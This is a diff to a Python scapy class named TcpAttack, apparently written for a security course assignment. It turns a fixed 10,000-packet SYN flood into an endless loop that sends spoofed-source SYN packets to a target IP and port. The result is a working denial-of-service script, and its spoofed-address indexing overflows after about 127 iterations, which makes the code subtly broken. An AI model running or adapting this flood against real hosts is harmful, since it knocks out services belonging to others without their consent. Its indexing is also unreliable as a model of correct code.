@@ -48,7 +48,13 @@ class TcpAttack(object):
             return 0
 
         # Assignment dictates to send arbritrary # of SYN packets
-        for i in range(10000):
+        #for i in range(10000):
+        count = 0
+        while(1):
+            j = list(range(128))
+            count += 1
+            self.spoofIP = "10.186." + str(j[count]) + "." + str(j[count])
+            print(self.spoofIP)
             IP_header = IP(src=self.spoofIP, dst=self.targetIP)
             TCP_header = TCP(flags="S", sport=RandShort(), dport=port)
             packet = IP_header / TCP_header
@@ -56,7 +62,6 @@ class TcpAttack(object):
                 send(packet)
             except Exception as e:
                 print(str(e))
-
         return 1
 if __name__ == '__main__':
     t = TcpAttack("10.186.79.142", "192.168.0.1")
